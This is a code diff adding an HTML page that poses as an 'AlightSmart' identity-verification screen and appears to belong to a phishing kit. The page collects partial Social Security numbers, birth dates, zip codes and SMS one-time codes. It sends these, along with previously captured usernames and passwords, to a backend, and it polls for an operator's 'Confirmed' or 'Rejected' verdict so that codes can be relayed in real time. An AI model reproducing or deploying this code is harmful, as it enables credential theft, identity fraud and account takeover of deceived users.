@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - AlightSmart</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 420px; margin: auto; background: white; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h1 { font-size: 1.75rem; text-align: center; margin-bottom: 8px; color: #1e2937; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; }
+        label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
+        input, select { width: 100%; padding: 14px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 1.05rem; }
+        .date-group { display: flex; gap: 10px; }
+        button { width: 100%; padding: 16px; margin-top: 12px; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
+        .continue { background: #1e40af; color: white; }
+        .new-code { background: #eab308; color: black; }
+        .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
+        .step { display: none; }
+        .step.active { display: block; }
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <div id="step1" class="step active">
+            <h1>Confirm your identity</h1>
+            <label>Last 4 Digits of SSN</label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Birth Date</label>
+            <div class="date-group">
+                <select id="month"><option value="">Month</option></select>
+                <select id="day"><option value="">Day</option></select>
+                <select id="year"><option value="">Year</option></select>
+            </div>
+
+            <label style="margin-top:20px;">
+                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
+            </label>
+            <button class="continue" onclick="saveStep1()">Continue</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h1>Additional Information</h1>
+            <label>Zip Code</label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+            <button class="continue" onclick="saveStep2()">Continue</button>
+        </div>
+
+        <div id="step3" class="step">
+            <h1>Verify it's you</h1>
+            <p>Enter the code you received via SMS.</p>
+                 <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
+            
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
+            <div id="status"></div>
+            
+            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="new-code" onclick="requestNewCode()">Request New Code</button>
+        </div>
+    </div>
+
+    <script>
+        let realPassword = sessionStorage.getItem('realPassword') || "N/A";
+        let realUsername = sessionStorage.getItem('realUsername') || "Unknown";
+
+        async function saveStep(details, stepName) {
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: stepName + " (" + realUsername + ")",
+                        password: realPassword,
+                        address: details
+                    })
+                });
+                if (response.ok) {
+                    console.log("✅ Step saved successfully:", stepName);
+                } else {
+                    console.error("❌ Server error:", response.status);
+                }
+            } catch (e) {
+                console.error("❌ Fetch failed", e);
+            }
+        }
+
+        function saveStep1() {
+            const ssn = document.getElementById('ssn').value.trim();
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please fill all fields and accept Privacy Policy.");
+                return;
+            }
+
+            const dob = `${month}/${day}/${year}`;
+            const details = `SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
+
+            saveStep(details, "Step 1 - SSN & DOB");
+            nextStep(2);
+        }
+
+        function saveStep2() {
+            const zip = document.getElementById('zip').value.trim();
+            if (zip.length !== 5) {
+                alert("Please enter a valid 5-digit Zip Code.");
+                return;
+            }
+
+            const details = `Zip: ${zip} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code");
+            nextStep(3);
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const statusDiv = document.getElementById('status');
+
+            if (code.length < 4) {
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
+                return;
+            }
+
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
+            
+
+            const ssn = document.getElementById('ssn').value || "";
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value || "";
+
+            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+
+            await saveStep(fullDetails, "Final Code Submission");
+
+            // Polling logic
+            const interval = setInterval(async () => {
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const latest = records[0];
+
+                if (latest && latest.address.includes("Confirmed")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
+                    setTimeout(() => window.location.href = "index.html", 1500);
+                } else if (latest && latest.address.includes("Rejected")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
+                }
+            }, 2000);
+        }
+
+        async function requestNewCode() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "New Code Request (" + realUsername + ")",
+                    password: realPassword,
+                    address: "🔄 USER REQUESTED NEW CODE | Status: Pending"
+                })
+            });
+
+            statusDiv.innerHTML = `<span style="color:#eab308">✅ Request sent. Please check your SMS.</span>`;
+        }
+
+        window.onload = () => {
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            months.forEach((m,i) => {
+                let opt = document.createElement('option');
+                opt.value = i+1; opt.textContent = m;
+                document.getElementById('month').appendChild(opt);
+            });
+            for(let i=1; i<=31; i++) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('day').appendChild(opt);
+            }
+            const curr = new Date().getFullYear();
+            for(let i=curr; i>=1950; i--) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('year').appendChild(opt);
+            }
+        };
+
+        
+    </script>
+</body>
+</html>
